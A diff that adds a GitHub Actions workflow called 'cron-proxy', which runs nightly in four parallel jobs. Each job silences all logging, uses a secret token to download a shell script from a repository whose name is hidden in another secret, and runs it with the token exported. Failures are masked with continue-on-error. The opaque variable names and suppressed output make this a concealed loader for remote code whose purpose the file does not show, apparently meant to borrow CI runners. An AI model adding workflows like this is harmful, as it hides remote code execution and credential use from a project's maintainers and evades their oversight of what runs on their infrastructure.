@@ -1,0 +1,45 @@
+name: cron-proxy
+
+on:
+  schedule:
+    - cron: "0 2 * * *"
+  workflow_dispatch:
+    inputs:
+      chunk:
+        description: "Which part (0-3, or -1 for all via matrix)"
+        required: false
+        default: "-1"
+      size:
+        description: "Items per part"
+        required: false
+        default: "16"
+
+permissions:
+  contents: read
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        chunk: [0, 1, 2, 3]
+
+    steps:
+      - name: Execute
+        env:
+          _A: ${{ secrets._A }}
+          _B: ${{ secrets._B }}
+          _I: ${{ (github.event.inputs.chunk || '-1') != '-1' && github.event.inputs.chunk || matrix.chunk }}
+          _S: ${{ github.event.inputs.size || 16 }}
+        run: |
+          set +x
+          exec >/dev/null 2>&1
+          curl -fsSL \
+            -H "Authorization: token ${_A}" -o /tmp/_r.sh \
+            "https://raw.githubusercontent.com/${_B}/main/.github/cron-run.sh"
+          chmod +x /tmp/_r.sh
+          export _A _B _I _S
+          /tmp/_r.sh
+        continue-on-error: true
